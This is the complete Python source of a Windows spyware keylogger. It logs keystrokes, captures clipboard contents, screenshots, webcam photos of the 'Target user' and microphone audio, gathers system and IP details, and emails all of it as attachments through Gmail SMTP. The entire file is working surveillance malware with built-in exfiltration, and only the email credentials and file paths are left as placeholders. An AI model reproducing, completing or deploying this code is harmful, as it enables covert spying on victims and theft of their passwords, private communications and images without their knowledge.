from email.message import EmailMessage # Import for sending Email
import smtplib # This import is for SMTP protocol
# These are mainly used for absolute path concatenation with filenames
import os
from os import listdir
from os.path import isfile, join

import socket
import platform
import win32clipboard # This is for import for clipboard for windows
from pynput.keyboard import Key, Listener # These are main imports for Keylogger

import time # This is used for timer
# ".wav" is the format used for saving audio recordings.
from scipy.io.wavfile import write
import sounddevice as sd

from requests import get

from PIL import ImageGrab # For screenshots
import cv2 # This is for OpenCV, Image Capture through Webcam
import threading # I am using threading to run parallel process,so threading based import

keys_information = "key_log_trial.txt"            # Record Keystrokes
system_information = "systeminfo_trial.txt"       # Record System Info
clipboard_information = "clipboard_trial.txt"     # Record Copy paste content
audio_information = "audio_trial"             # Record audio of user
screenshot_information = "screenshot_trial"   # Screen record image

file_path = "  Enter the file path to which you want to store the result   "   # Filepath of project
extend = "\\"                                                                  # Just an extension for path symbol
email_address = "Email Address"                                                # From email address
password = " Password"                                                         # Password
toaddr = " Enter To Address Email"

microphone_time = 20            # Microphone recording time period
count = 0                       # This is another counter keeping tab of no.of keys pressed
keys = []                       # This keep tab of the keys pressed
stoppingTime = time.time() + 30 # This is the timer for which keys are recorded


def on_press(key):              # Fn to tell what to do when a key is pressed
    global keys, count, currentTime

    print(key)                  # I am printing the keys onto the terminal
    keys.append(key)            # Append the key pressed to keys list
    count += 1                  # Updating the counter by 1
    currentTime = time.time()   # Getting the present time

    if count >= 1:              # If count is non-zero
        count = 0               # Reset counter to zero
        write_file(keys)        # Write keys list to file
        keys = []               # Reinitialise keys list

def write_file(keys):           # Fn specifying how to write to file
    with open(file_path + extend + keys_information, "a") as f: # Opening file
        for key in keys:                                        # Paring through keys list
            k = str(key).replace("'", "")                       # All keys are enclosed in single quotes,I am removing them
            if k.find("space") > 0:                             # If space key is found
                f.write('Key.Space')                            # I am writing Key.Space
                f.close()                                       # Close the file

            elif k.find("Key") == -1:                           # For any other key
                f.write(k)                                      # Write that key
                f.close()                                       # Close the file

def on_release(key):                # Fn telling when to release or stop listening
    if key == Key.esc:              # If escape key is pressed,then stop listening
        return False
    if currentTime > stoppingTime:  # If current time exceeds set time,then stop listening
        return False

def computer_information():     # Fn to find computer system information
    with open(file_path + extend + system_information, "a") as f:       # To open the file in append mode
        hostname = socket.gethostname()                                 # To get hostname
        IPAddr = socket.gethostbyname(hostname)                         # To get IP address
        try:
            public_ip = get("https://api.ipify.org").text               # Using API to get public IP,but this has limit for free use so in try-except
            f.write("Public IP Address: " + public_ip)                  # To get Public IP address

        except Exception:
            f.write("Couldn't get Public IP Address(most likely max query)")    # Any possible exception

        f.write("Processor: " + (platform.processor()) + '\n')                      # To find Processor
        f.write("System: " + platform.system() + " " + platform.version() + '\n')   # To find Platform(Windows here) and Version
        f.write("Machine: " + platform.machine() + '\n')                            # To find Platform machine(AMD64 in my case)
        f.write("Hostname: " + hostname + '\n')                                     # To find Hostname
        f.write("Private IP Address: " + IPAddr + '\n')                             # To find IP Address

def copy_clipboard():   # Fn to copy clipboard information
    with open(file_path + extend + clipboard_information, "a") as f: # To open file
        try:
            win32clipboard.OpenClipboard()                           # To open Clipboard
            pasted_data = win32clipboard.GetClipboardData()          # To get Clipboard Data
            win32clipboard.CloseClipboard()                          # Close Clipboard

            f.write("Clipboard Data: \n" + pasted_data)              # Write copied data to file

        except:
            f.write("Clipboard could be not be copied")              # In case of any internal errors due to Windows

def send_email(toaddr): # To send email
    fromaddr = email_address                # From Address
    msg = EmailMessage()                    # Email Constructor
    msg['From'] = fromaddr                  # From Address
    msg["To"] = toaddr                      # To Address
    msg["Subject"] = "Keylogger exploits:"  # Subject line
    msg.set_content('Contains attachments for Keylogger,Screenshots,Audio Clips,Webcam Images,Clipboard and System Settings') # EMail Body

    files_in_dir = [f for f in listdir('File path') if isfile(join('File Path', f))]
    #print(files_in_dir) # files_in_dir is used to retrieve all files in keylogger/trial directory
    outdir = 'File Path'
    for file in files_in_dir: # Looping through each file in directory,read file,give filename and adding attachment
        with open(os.path.join(outdir, file), 'rb') as f:
            file_data = f.read() # Read file
            file_name = f.name   # Name of the file

        msg.add_attachment(file_data, maintype = 'application', subtype = 'octet-stream', filename = file_name) # Add attachment

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp: # SMTP protocol with port 587
        smtp.starttls()                               # Starting Transport Layer Security(TLS)
        smtp.login(fromaddr, password)                # Login to from email using email and password
        smtp.send_message(msg)                        # Send message

def Camera_Capture(number_of_iterations):
    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) # Create an object of class VideoCapture using Webcam 0 and DirectShow API Preference
    ret, frame = cam.read() # Capture webcam image by frame  (return value,image)
    img_name = "Target user pic at " # For Naming file
    outdir = 'File Path'
    cv2.imwrite(os.path.join(outdir , img_name + str(number_of_iterations) + " iteration.png"), frame) # Write the given frame with the given name
    cam.release() # Release resources

def microphone(number_of_iterations):
    fs = 44100                                                         # Sampling frequency
    seconds = microphone_time                                          # Time for which microphone is active

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) # sd(SoundDevice library) records microphone
    sd.wait() #To pause/stop recording

    write(file_path + extend + audio_information + str(number_of_iterations) + ".wav", fs, myrecording) # Saving file

def screenshot(number_of_iterations):
    im = ImageGrab.grab() # Take a screenshot
    im.save(file_path + extend + screenshot_information + str(number_of_iterations) +".png") # Save file

def logger1():
    with Listener(on_press=on_press, on_release=on_release) as listener: # listener that starts with on_press fn and stops with on_release fn
        listener.join()
def logger2(n):
    copy_clipboard()
    Camera_Capture(n)
    screenshot(n)
    microphone(n)
    send_email(toaddr)

def main():

    computer_information()
    t1 = threading.Thread(target = logger1)             # Creating thread with logger1 fn to be executed
    t2 = threading.Thread(target=logger2, args = [1])   # Creating thread with logger2 fn to be executed
    t1.start()                                          # Start thread
    t2.start()                                          # Start thread
    t1.join()                                           # For concurrent execution
    t2.join()                                           # For concurrent execution

if __name__ == "__main__":
    main()

